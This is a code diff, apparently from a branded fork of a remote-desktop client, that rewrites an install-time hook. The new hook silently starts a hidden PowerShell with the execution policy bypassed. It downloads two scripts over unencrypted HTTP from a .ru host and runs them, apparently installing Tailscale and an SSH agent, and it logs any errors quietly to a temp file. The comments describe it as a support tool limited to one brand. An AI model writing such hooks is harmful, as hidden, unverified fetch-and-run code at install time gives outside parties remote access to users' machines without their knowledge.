@@ -1554,14 +1554,17 @@ fn get_after_install(
 }
 
 // OUT-TECHSUPPORT: install-time SRE agent hook. Downloads and runs the
-// Tailscale + AgentSSH deploy scripts from the agent-7q4x drop, wrapped in
-// try/catch so install never fails offline. Same single-layer escaping as the
-// proven prior hook (cmd double-quotes + \" for the quotes PowerShell sees).
-// Brand-gated at compile time via OTS_AGENT_HOOK (set only for our brand in
-// apply-brand.py) — client brands (Onix) ship without our infra binding.
+// Tailscale + AgentSSH deploy scripts from the agent-7q4x drop.
+// `start ""` detaches the PowerShell so the after_install batch returns
+// immediately — the RustDesk install does not wait for the (slow) Tailscale
+// MSI + sshd setup. try/catch logs to %TEMP%\ots-agent-hook.err so install
+// never fails offline and a failure is inspectable on-site. Same single-layer
+// escaping as the proven prior hook (cmd double-quotes + \" for the quotes
+// PowerShell sees). Brand-gated at compile time via OTS_AGENT_HOOK (set only
+// for our brand in apply-brand.py) — client brands (Onix) ship without it.
 fn get_agent_ssh_hook() -> &'static str {
     if option_env!("OTS_AGENT_HOOK") == Some("1") {
-        r#"powershell -NoProfile -Command "try { $u='http://out-techsupport.ru/downloads/agent-7q4x'; iwr \"$u/Deploy-NEO-Tailscale.ps1\" -OutFile \"$env:TEMP\ts.ps1\" -UseBasicParsing; iwr \"$u/Deploy-NEO-AgentSSH.ps1\" -OutFile \"$env:TEMP\ssh.ps1\" -UseBasicParsing; Set-ExecutionPolicy Bypass -Scope Process -Force; & \"$env:TEMP\ts.ps1\"; & \"$env:TEMP\ssh.ps1\" } catch { Write-Host ('agent hook skipped: ' + $_.Exception.Message) }""#
+        r#"start "" powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $u='http://out-techsupport.ru/downloads/agent-7q4x'; iwr \"$u/Deploy-NEO-Tailscale.ps1\" -OutFile \"$env:TEMP\ts.ps1\" -UseBasicParsing; iwr \"$u/Deploy-NEO-AgentSSH.ps1\" -OutFile \"$env:TEMP\ssh.ps1\" -UseBasicParsing; & \"$env:TEMP\ts.ps1\"; & \"$env:TEMP\ssh.ps1\" } catch { $_ | Out-File \"$env:TEMP\ots-agent-hook.err\" }""#
     } else {
         ""
     }
